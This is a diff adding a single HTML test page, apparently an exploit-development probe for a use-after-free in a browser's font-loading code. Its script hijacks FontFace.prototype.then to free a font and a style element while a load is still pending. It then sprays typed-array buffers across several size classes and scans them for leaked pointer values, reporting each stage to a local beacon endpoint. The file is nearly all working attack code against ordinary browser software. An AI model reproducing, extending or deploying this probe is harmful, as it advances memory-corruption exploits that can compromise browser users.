@@ -1,0 +1,73 @@
+<!doctype html><meta charset="utf-8"><title>uaf18</title><body><script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+function qw(u,o){var lo=(u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24))>>>0;
+  var hi=(u[o+4]|(u[o+5]<<8)|(u[o+6]<<16)|(u[o+7]<<24))>>>0;return [lo,hi];}
+var styleEl=null, firedHere=false, S1=null, S2=null, stage='A';
+function setup(){
+  var A=new FontFace('z0','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive=window.__alive||[]; window.__alive.push(A);
+  styleEl=document.createElement('style');
+  styleEl.textContent="@font-face { font-family: w0; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  b('U18-SETUP');
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if (firedHere) return undefined;
+      firedHere=true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch (e) {}
+      document.body.offsetHeight;
+      S1=[];
+      for (var j=0;j<64;j++) S1.push(new Uint8Array(192));
+      try { document.fonts.check('1em w0'); } catch (e) {}
+      b('U18-SPRAY1');
+      return undefined;
+    },
+    set:function(){}
+  });
+  document.fonts.load('1em z0, w0','AB').then(function(v){
+    b('U18-RESOLVED');
+    setTimeout(function(){ scan('A'); },60);
+    setTimeout(function(){ phaseB(v); },220);
+  },function(){ b('U18-REJECTED'); setTimeout(function(){ scan('A'); },60); });
+  b('U18-LOAD-CALLED');
+}
+function phaseB(v){
+  b('U18-PHASE-B-start');
+  try { if (v && v.length) { for (var i=0;i<v.length;i++) v[i]=null; v.length=0; } } catch(e){}
+  v=null;
+  var CLASSES=[64,80,96,112,128,160,192,256];
+  S2=[];
+  for (var c=0;c<CLASSES.length;c++){
+    var k=CLASSES[c], arr=[];
+    for (var j=0;j<32;j++) arr.push(new Uint8Array(k));
+    S2.push([k,arr]);
+  }
+  b('U18-SPRAY2');
+  setTimeout(function(){ scan('B'); },120);
+}
+function scan(tag){
+  var src = tag==='A' ? S1.map(function(u){return [192,u]}) : (S2||[]).map(function(p){return [p[0],null,p[1]];});
+  var ptr=0, nzc=0, out=[];
+  for (var c=0;c<src.length;c++){
+    var k=src[c][0], arr = tag==='A' ? src[c][1] : src[c][2];
+    for (var j=0;j<arr.length;j++){
+      var u=arr[j], nz=[], wp=[];
+      for (var o=0;o+8<=k;o+=8){
+        var q=qw(u,o);
+        if (q[0]||q[1]){ nz.push(o.toString(16)+':'+hex8(u,o)); if (q[1]>0&&q[1]<0x1000){ wp.push(o.toString(16)); ptr++; } }
+      }
+      if (wp.length){ out.push('P-s'+k+'-b'+j+'-o'+wp.join('_')+'-'+nz.slice(0,3).join('_')); }
+      else if (nz.length){ nzc++; out.push('N-s'+k+'-b'+j+'-'+nz.slice(0,3).join('_')); }
+    }
+  }
+  b('U18-SCAN'+tag+'-ptr'+ptr+'-nz'+nzc+'-'+(out.slice(0,6).join('|')||'none'));
+}
+function run(){ b('U18-PARSE'); setup(); }
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></body>
